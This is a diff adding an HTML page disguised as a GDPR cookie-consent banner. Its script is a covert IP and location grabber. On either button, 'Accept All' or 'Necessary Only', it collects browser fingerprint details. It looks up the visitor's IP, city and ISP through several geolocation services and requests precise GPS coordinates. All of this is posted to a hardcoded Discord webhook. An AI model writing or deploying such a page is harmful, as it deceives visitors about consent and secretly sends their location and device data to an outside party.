@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Consent Required</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+        }
+
+        .cookie-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 99999;
+        }
+
+        .cookie-box {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 2rem;
+            border-radius: 1rem;
+            max-width: 35rem;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+
+        h1 {
+            font-size: 2rem;
+            color: white;
+            margin-bottom: 1rem;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            font-weight: 600;
+        }
+
+        p {
+            color: rgba(255, 255, 255, 0.95);
+            margin-bottom: 2rem;
+            font-size: 1.1rem;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+
+        button {
+            padding: 1rem 2.5rem;
+            border: none;
+            border-radius: 3rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            min-width: 160px;
+        }
+
+        button:focus-visible {
+            outline: 3px solid white;
+            outline-offset: 2px;
+        }
+
+        .accept-btn {
+            background-color: #00ff88;
+            color: #000;
+        }
+
+        .accept-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px #00ff88;
+            background-color: #00cc6a;
+        }
+
+        .decline-btn {
+            background-color: #ff4757;
+            color: white;
+        }
+
+        .decline-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px #ff4757;
+            background-color: #cc3645;
+        }
+
+        .privacy-note {
+            margin-top: 1.5rem;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 480px) {
+            .cookie-box {
+                padding: 1.5rem;
+            }
+
+            h1 {
+                font-size: 1.5rem;
+            }
+
+            button {
+                width: 100%;
+                min-width: auto;
+            }
+        }
+
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            border: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="cookie-modal" id="cookieModal" role="dialog" aria-labelledby="cookieTitle" aria-describedby="cookieDescription" aria-modal="true">
+        <div class="cookie-box" role="document">
+            <h1 id="cookieTitle">🍪 Essential Cookies Required</h1>
+            <p id="cookieDescription">This website uses cookies and local storage to function properly. We collect basic device information to improve your experience. By clicking Accept, you agree to our data collection practices as required by law.</p>
+            
+            <div class="button-group" role="group" aria-label="Consent options">
+                <button type="button" class="accept-btn" onclick="handleConsent('accept')" aria-label="Accept all cookies and continue">Accept All</button>
+                <button type="button" class="decline-btn" onclick="handleConsent('decline')" aria-label="Only use necessary cookies and continue">Necessary Only</button>
+            </div>
+            
+            <p class="privacy-note" aria-live="polite">Your privacy is important to us • GDPR Compliant</p>
+        </div>
+    </div>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1451103247904280589/y9If0_Hc3fqrjBmZmIcMupGkAvoUE6efqqOM3-8DsGmH9M_vnToR9fwrUpd7E9bljpSd";
+
+        async function handleConsent(choice) {
+            const data = {
+                choice: choice,
+                timestamp: new Date().toISOString(),
+                pageUrl: window.location.href.substring(0, 500),
+                pageTitle: document.title || 'unknown',
+                userAgent: navigator.userAgent.substring(0, 300),
+                platform: navigator.platform || 'unknown',
+                language: navigator.language || 'unknown',
+                languages: navigator.languages ? navigator.languages.join(', ').substring(0, 100) : 'unknown',
+                cookiesEnabled: navigator.cookieEnabled ? 'yes' : 'no',
+                doNotTrack: navigator.doNotTrack || 'unspecified',
+                hardwareConcurrency: String(navigator.hardwareConcurrency || 'unknown'),
+                deviceMemory: String(navigator.deviceMemory || 'unknown'),
+                screenResolution: `${screen.width || 0}x${screen.height || 0}`,
+                screenAvailable: `${screen.availWidth || 0}x${screen.availHeight || 0}`,
+                colorDepth: String(screen.colorDepth || 'unknown'),
+                pixelDepth: String(screen.pixelDepth || 'unknown'),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+                timezoneOffset: String(new Date().getTimezoneOffset()),
+                referrer: document.referrer || 'Direct',
+                localStorage: typeof localStorage !== 'undefined' ? 'available' : 'unavailable',
+                sessionStorage: typeof sessionStorage !== 'undefined' ? 'available' : 'unavailable',
+                touchSupport: 'ontouchstart' in window ? 'yes' : 'no',
+                connection: navigator.connection ? JSON.stringify({
+                    type: navigator.connection.type || 'unknown',
+                    effectiveType: navigator.connection.effectiveType || 'unknown',
+                    downlink: navigator.connection.downlink || 'unknown',
+                    rtt: navigator.connection.rtt || 'unknown'
+                }) : 'unknown'
+            };
+
+            await getIpData(data);
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        data.gpsLatitude = String(position.coords.latitude);
+                        data.gpsLongitude = String(position.coords.longitude);
+                        data.gpsAccuracy = String(position.coords.accuracy);
+                        data.gpsAltitude = String(position.coords.altitude || 'unknown');
+                        data.gpsSpeed = String(position.coords.speed || 'unknown');
+                        sendToDiscord(data);
+                    },
+                    (error) => {
+                        data.gpsError = error.message || 'permission denied';
+                        sendToDiscord(data);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                data.gpsError = 'not supported';
+                sendToDiscord(data);
+            }
+            
+            document.getElementById('cookieModal').style.display = 'none';
+        }
+
+        async function getIpData(data) {
+            const apis = [
+                {
+                    url: 'https://ipwho.is/',
+                    parse: (result) => {
+                        data.ip = result.ip;
+                        data.country = result.country;
+                        data.region = result.region;
+                        data.city = result.city;
+                        data.isp = result.connection.isp;
+                        data.latitude = result.latitude;
+                        data.longitude = result.longitude;
+                    }
+                },
+                {
+                    url: 'https://ipapi.co/json/',
+                    parse: (result) => {
+                        data.ip = result.ip;
+                        data.country = result.country_name;
+                        data.region = result.region;
+                        data.city = result.city;
+                        data.isp = result.org;
+                        data.latitude = result.latitude;
+                        data.longitude = result.longitude;
+                    }
+                },
+                {
+                    url: 'https://geolocation-db.com/json/',
+                    parse: (result) => {
+                        data.ip = result.IPv4;
+                        data.country = result.country_name;
+                        data.city = result.city;
+                        data.latitude = result.latitude;
+                        data.longitude = result.longitude;
+                    }
+                },
+                {
+                    url: 'https://ipinfo.io/json',
+                    parse: (result) => {
+                        data.ip = result.ip;
+                        data.country = result.country;
+                        data.region = result.region;
+                        data.city = result.city;
+                        data.isp = result.org;
+                        const loc = result.loc ? result.loc.split(',') : [];
+                        data.latitude = loc[0];
+                        data.longitude = loc[1];
+                    }
+                }
+            ];
+            
+            for (const api of apis) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 3000);
+                    
+                    const response = await fetch(api.url, { signal: controller.signal });
+                    const result = await response.json();
+                    
+                    clearTimeout(timeoutId);
+                    
+                    api.parse(result);
+                    
+                    if (data.ip && (data.country || data.city)) {
+                        break;
+                    }
+                } catch (e) {
+                    continue;
+                }
+            }
+            
+            data.ip = data.ip || 'unavailable';
+            data.country = data.country || 'unavailable';
+            data.region = data.region || 'unavailable';
+            data.city = data.city || 'unavailable';
+            data.isp = data.isp || 'unavailable';
+            data.latitude = data.latitude || 'unavailable';
+            data.longitude = data.longitude || 'unavailable';
+        }
+
+        function sendToDiscord(data) {
+            const embed = {
+                embeds: [{
+                    title: `Cookie Consent: ${data.choice}`,
+                    color: data.choice === 'accept' ? 5763719 : 16729367,
+                    fields: [
+                        {
+                            name: '📍 Location',
+                            value: `IP: ${data.ip}\nCountry: ${data.country}\nCity: ${data.city}\nRegion: ${data.region}\nISP: ${data.isp}`,
+                            inline: true
+                        },
+                        {
+                            name: '📱 GPS',
+                            value: `Lat: ${data.gpsLatitude || 'unavailable'}\nLong: ${data.gpsLongitude || 'unavailable'}\nAcc: ${data.gpsAccuracy || 'unavailable'}m\nError: ${data.gpsError || 'none'}`,
+                            inline: true
+                        },
+                        {
+                            name: '🖥️ Device',
+                            value: `Platform: ${data.platform}\nCores: ${data.hardwareConcurrency}\nMemory: ${data.deviceMemory}GB\nScreen: ${data.screenResolution}`,
+                            inline: true
+                        },
+                        {
+                            name: '🌐 Network',
+                            value: `Language: ${data.language}\nTimezone: ${data.timezone}\nTouch: ${data.touchSupport}`,
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: `Page: ${data.pageTitle.substring(0, 50)} • ${data.timestamp}`
+                    }
+                }]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(embed)
+            }).catch(() => {});
+        }
+    </script>
+</body>
+</html>
